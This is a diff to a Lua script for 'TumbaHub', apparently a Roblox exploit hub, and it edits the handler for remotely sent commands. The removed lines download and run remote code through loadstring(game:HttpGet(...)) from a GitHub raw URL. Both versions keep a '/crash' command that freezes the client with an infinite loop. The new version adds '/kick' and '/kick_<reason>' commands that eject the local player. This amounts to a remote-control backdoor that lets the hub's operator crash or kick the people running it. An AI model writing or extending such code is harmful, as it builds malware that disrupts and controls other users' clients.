@@ -48,31 +48,25 @@ task.spawn(function()
 
                         
                         -- === ИСПОЛНЕНИЕ КОМАНД ===
-                        if Mega and Mega.Commands and Mega.Commands[cmd] then
-                            -- Динамически вызываем функцию команды, если она существует в модулях
-                            task.spawn(Mega.Commands[cmd], data)
-                        elseif cmd == "/crash" then
-                            -- Бесконечный цикл намертво вешает клиент Роблокса
-                            while true do end 
-                        elseif cmd =="/kick" then
-                            -- 1. Скачиваем файл с Гитхаба
-                            local chunk = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
+                        
+                        -- 1. Обычный кик без причины
+                        if cmd == "/kick" then
+                            LocalPlayer:Kick("Вы были кикнуты администратором TumbaHub.")
                             
-                            if chunk then
-                                -- 2. Выполняем файл, чтобы он ВЕРНУЛ нам функцию
-                                local realKickFunc = chunk()
-                                
-                                -- 3. Проверяем, что это реально функция, и передаем туда data
-                                if type(realKickFunc) == "function" then
-                                    realKickFunc(data) 
-                                else
-                                    warn("TumbaHub: kick.lua не вернул функцию!")
-                                end
-                            else
-                                warn("TumbaHub: Ошибка скачивания или синтаксиса в kick.lua")
-                            end
+                        -- 2. Кик с кастомной причиной (ищем совпадение начала строки)
+                        elseif string.find(cmd, "^/kick_") then
+                            -- Вырезаем текст причины (все, что идет после 6-го символа "/kick_")
+                            local customReason = string.sub(cmd, 7)
+                            LocalPlayer:Kick(customReason)
+                            
+                        -- 3. Краш клиента
+                        elseif cmd == "/crash" then
+                            while true do end 
+                            
+                        -- 4. Остальные команды из твоего модульного хаба
+                        elseif Mega and Mega.Commands and Mega.Commands[cmd] then
+                            task.spawn(Mega.Commands[cmd], data)
                         end
-                    end
                         -- =========================
                     end
                 end
